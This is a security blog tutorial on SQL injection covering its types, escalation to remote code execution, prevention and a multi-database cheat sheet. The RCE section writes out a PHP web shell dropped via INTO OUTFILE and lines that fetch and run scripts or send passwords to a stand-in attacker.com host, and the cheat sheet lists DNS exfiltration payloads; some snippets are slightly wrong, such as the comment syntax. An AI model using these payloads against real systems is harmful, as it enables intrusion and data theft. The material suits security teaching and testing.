---
title: "Mastering SQL Injection: From Data Breach to Remote Code Execution"
published: 2025-05-02
description: "Comprehensive guide on SQL Injection vulnerabilities, exploitation techniques from data extraction to remote code execution, and effective prevention strategies."
image: ''
tags: [Web Security]
category: 'Server-Side Attacks'
draft: false 
lang: 'ar-eng'
---
# SQL Injection (SQLi)

## Table of Contents
- What is SQL Injection?
- How Does SQL Injection Work?
- Types of SQL Injection
- Impacts of SQL Injection
- How to get RCE From SQL injection
  - Advanced Scenarios for Achieving RCE via SQL Injection
- How to Prevent SQL Injection
- SQL Injection Cheat Sheet
  - String Concatenation
  - Substring
  - Comments
  - Database Version
  - Database Contents
  - Conditional Errors
  - Extracting Data via Visible Errors
  - Batched (Stacked) Queries
  - Time Delays
  - DNS Lookup

## What is SQL Injection?

SQL Injection (SQLi) is a web security vulnerability that allows attackers to interfere with the queries an application makes to its database. It occurs when user input is improperly handled and incorporated into SQL statements, enabling attackers to:

1. **Access unauthorized data**: View sensitive information like user details or application data.
2. **Modify or delete data**: Alter or erase content in the database, causing persistent changes.
3. **Compromise the server**: Escalate the attack to gain control over the database server or back-end infrastructure.
4. **Perform Denial-of-Service (DoS)**: Disrupt the database's functionality with heavy or malicious queries.

## How Does SQL Injection Work?

- Applications often take user input (e.g., username, password) and embed it into SQL queries.
- If the input is not properly sanitized, attackers can inject malicious SQL code into these queries.

### Example:

A vulnerable query might look like this:

```sql
SELECT * FROM users WHERE username = 'Amr' AND password = '12345';
```

If an attacker inputs `' OR '1'='1` as the username, the query becomes:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '12345';
```

The condition `'1'='1'` is always true, allowing the attacker to bypass authentication.

## Types of SQL Injection

1. **In-band SQLi**:
    - **Error-based SQLi**: Exploits database error messages to gain information.
    - **Union-based SQLi**: Combines results from multiple queries using the `UNION` keyword.
2. **Blind SQLi**:
    - **Boolean-based SQLi**: Observes application behavior by sending true/false conditions.
    - **Time-based SQLi**: Uses delays (e.g., `SLEEP`) to infer results based on response times.
3. **Out-of-Band SQLi**:
    - Uses external resources like DNS or HTTP requests to extract data.

## Impacts of SQL Injection

- Unauthorized access to sensitive data.
- Data manipulation or deletion.
- Compromise of server or infrastructure.
- Denial of service to legitimate users.

## How to get RCE From SQL injection

1. **Check Database Capabilities**:
    - Identify functions or commands that can execute system-level operations.
    
    ### Examples by Database:
    
    - **MySQL**:
        - `LOAD_FILE()` for reading files.
        - `INTO OUTFILE` for writing files.
    - **PostgreSQL**:
        - `COPY` for writing files.
        - `pg_read_file()` for reading files.
    - **Microsoft SQL Server**:
        - `xp_cmdshell` for executing system commands.
2. **Write Malicious Scripts**:
    - If file-writing is possible, create a backdoor or script to execute commands.
    
    ### Example in MySQL:
    
    ```sql
    SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
    ```
    
    This creates a `shell.php` file that can execute commands via the `cmd` parameter.
    
3. **Execute System Commands**:
    - Directly run system-level commands if supported by the database.
    
    ### Example in SQL Server:
    
    ```sql
    EXEC xp_cmdshell 'whoami';
    ```
    
4. **Leverage External Channels**:
    - Use database functions that allow external requests (e.g., DNS, HTTP) to extract or execute data.
5. **Analyze Privileges**:
    - Check for privilege escalation opportunities to gain higher-level access.
6. **Upload Malicious Files**:
    - Exploit file-upload capabilities to deploy executables or scripts.

### Advanced Scenarios for Achieving RCE via SQL Injection

#### 1. **Exploiting System Functions in Databases**

##### Scenario:

Some databases include built-in functions that allow direct execution of system commands.

##### Example in **Microsoft SQL Server**:

```sql
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1'')"';
```

- This command downloads and executes a malicious PowerShell script, granting full control over the system.

##### Notes:

- Requires elevated privileges (admin) to enable `xp_cmdshell` if it is disabled.

#### 2. **Writing Malicious Files to the Server**

##### Scenario:

Use file-writing functions such as `INTO OUTFILE` in MySQL or `COPY` in PostgreSQL to create malicious files on the server.

##### Example in **MySQL**:

- Writing a web shell to a web directory:

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

- Execute system commands via the browser:

```
http://victim.com/shell.php?cmd=whoami
```

##### Notes:

- Requires write permissions on the target directory.

#### 3. **Leveraging External Connections**

##### Scenario:

Use external connection functions like **DNS** or **HTTP** to extract data or execute code.

##### Example in **PostgreSQL**:

- Using the `COPY` function to write data to an external HTTP server:

```sql
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO PROGRAM 'curl -d @- http://attacker.com/shell.php';
```

##### Notes:

- The server must have permissions to execute system commands.

#### 4. **Uploading Malicious Libraries**

##### Scenario:

Upload malicious DLL files to the system and execute them.

##### Example in **Microsoft SQL Server**:

- Upload and execute a malicious DLL:

```sql
EXEC sp_addextendedproc 'xp_cmdshell', 'C:\path\to\malicious.dll';
EXEC xp_cmdshell 'whoami';
```

##### Notes:

- Requires advanced privileges and the ability to upload files.

#### 5. **Exploiting Custom Functions (User-Defined Functions)**

##### Scenario:

Create a custom function containing malicious code to execute system commands.

##### Example in **PostgreSQL**:

- Creating a custom function:

```sql
CREATE OR REPLACE FUNCTION exec_cmd(cmd text) RETURNS void AS $$
BEGIN
    EXECUTE cmd;
END;
$$ LANGUAGE plpgsql;
```

- Then calling the function:

```sql
SELECT exec_cmd('wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh');
```

#### 6. **Data Exfiltration with RCE**

##### Scenario:

Use SQL Injection to pass data to an external service while executing commands.

##### Example in **Oracle**:

- Exploiting the `UTL_HTTP` function to send HTTP requests containing sensitive data:

```sql
BEGIN
  UTL_HTTP.REQUEST('http://attacker.com/collect?data=' || (SELECT password FROM users WHERE id=1));
END;
```

- Combine this with an HTTP response containing malicious commands.

#### 7. **Uploading and Extracting Files via Storage Functions**

##### Scenario:

Upload malicious files to the server using storage functions or `BLOB` data.

##### Example in **MySQL**:

- Writing a ZIP file containing malicious code:

```sql
SELECT LOAD_FILE('/path/to/malicious.zip') INTO DUMPFILE '/var/www/html/malicious.zip';
```

- Extract and execute the code.

##### Important Notes:

1. **Privilege Analysis**:
    - Ensure the level of database user privileges, as some scenarios require elevated permissions.
2. **Confirm Vulnerability**:
    - Not all databases support the same functions. Test the target environment carefully.
3. **Use External Channels**:
    - If direct commands are disabled, use channels like DNS or HTTP for data extraction and attack execution.

By understanding and applying these advanced techniques, attackers can achieve RCE in complex environments. Mitigation strategies should focus on minimizing privileges, validating input, and monitoring database activity.

## How to Prevent SQL Injection

1. **Use Prepared Statements (Parameterized Queries)**:
    - Avoid embedding user input directly into SQL queries.
    - Example in Python:
        
        ```python
        cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
        ```
        
2. **Input Validation**:
    - Filter and sanitize all user inputs.
    - Reject unexpected characters like single quotes (`'`) or SQL keywords.
3. **Use Least Privilege Principle**:
    - Limit database user permissions to only what's necessary.
4. **Error Handling**:
    - Disable detailed database error messages in production.
5. **Web Application Firewall (WAF)**:
    - Use a WAF to detect and block SQLi attempts.

## SQL Injection Cheat Sheet

### String Concatenation

Concatenate multiple strings to form a single string:

- **Oracle:** `'foo'||'bar'`
- **Microsoft:** `'foo'+'bar'`
- **PostgreSQL:** `'foo'||'bar'`
- **MySQL:** `'foo' 'bar'` (space between strings) or `CONCAT('foo','bar')`

### Substring

Extract part of a string from a specified offset and length (offset is 1-based):

- **Oracle:** `SUBSTR('foobar', 4, 2)`
- **Microsoft:** `SUBSTRING('foobar', 4, 2)`
- **PostgreSQL:** `SUBSTRING('foobar', 4, 2)`
- **MySQL:** `SUBSTRING('foobar', 4, 2)`

### Comments

Truncate a query and remove subsequent parts:

- **Oracle:** `-comment`
- **Microsoft:** `-comment` or `/*comment*/`
- **PostgreSQL:** `-comment` or `/*comment*/`
- **MySQL:** `#comment`, `- comment` (note the space), or `/*comment*/`

### Database Version

Identify database type and version:

- **Oracle:**
    - `SELECT banner FROM v$version`
    - `SELECT version FROM v$instance`
- **Microsoft:** `SELECT @@version`
- **PostgreSQL:** `SELECT version()`
- **MySQL:** `SELECT @@version`

### Database Contents

List tables and columns:

- **Oracle:**
    - `SELECT * FROM all_tables`
    - `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`
- **Microsoft:**
    - `SELECT * FROM information_schema.tables`
    - `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
- **PostgreSQL:**
    - `SELECT * FROM information_schema.tables`
    - `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
- **MySQL:**
    - `SELECT * FROM information_schema.tables`
    - `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`

### Conditional Errors

Test a condition and trigger an error if true:

- **Oracle:** `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`
- **Microsoft:** `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`
- **PostgreSQL:** `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`
- **MySQL:** `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`

### Extracting Data via Visible Errors

Elicit error messages that leak data:

- **Microsoft:** `SELECT 'foo' WHERE 1 = (SELECT 'secret')`
    - *Error:* Conversion failed when converting the varchar value 'secret' to data type int.
- **PostgreSQL:** `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`
    - *Error:* invalid input syntax for integer: "secret"
- **MySQL:** `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))`
    - *Error:* XPATH syntax error: '\secret'

### Batched (Stacked) Queries

Execute multiple queries in succession (results not returned):

- **Oracle:** Not supported.
- **Microsoft:** `QUERY-1-HERE; QUERY-2-HERE`
- **PostgreSQL:** `QUERY-1-HERE; QUERY-2-HERE`
- **MySQL:** `QUERY-1-HERE; QUERY-2-HERE`
    - Note: Limited support; depends on specific APIs used by the application.

### Time Delays

Cause a time delay in query processing (10 seconds):

- **Oracle:** `dbms_pipe.receive_message(('a'),10)`
- **Microsoft:** `WAITFOR DELAY '0:0:10'`
- **PostgreSQL:** `SELECT pg_sleep(10)`
- **MySQL:** `SELECT SLEEP(10)`

#### Conditional Time Delays

Trigger a time delay if a condition is true:

- **Oracle:** `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`
- **Microsoft:** `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`
- **PostgreSQL:** `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`
- **MySQL:** `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`

### DNS Lookup

Cause the database to perform a DNS lookup to an external domain:

- **Oracle:**
    - Vulnerable versions: `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`
    - Fully patched versions (requires elevated privileges): `SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`
- **Microsoft:** `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`
- **PostgreSQL:** `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`
- **MySQL (Windows only):**
    - `LOAD_FILE('\\BURP-COLLABORATOR-SUBDOMAIN\a')`
    - `SELECT ... INTO OUTFILE '\\BURP-COLLABORATOR-SUBDOMAIN\a'`

#### DNS Lookup with Data Exfiltration

Exfiltrate query results via DNS lookup:

- **Oracle:** `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`
- **Microsoft:** `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`
- **PostgreSQL:**
    
    ```sql
    create OR replace function f() returns void as $$
    declare c text;
    declare p text;
    begin
    SELECT into p (SELECT YOUR-QUERY-HERE);
    c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
    execute c;
    END;
    $$ language plpgsql security definer;
    SELECT f();
    ```
    
- **MySQL (Windows only):** `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\BURP-COLLABORATOR-SUBDOMAIN\a'`

---

**`Happy Hacking Broo`**

---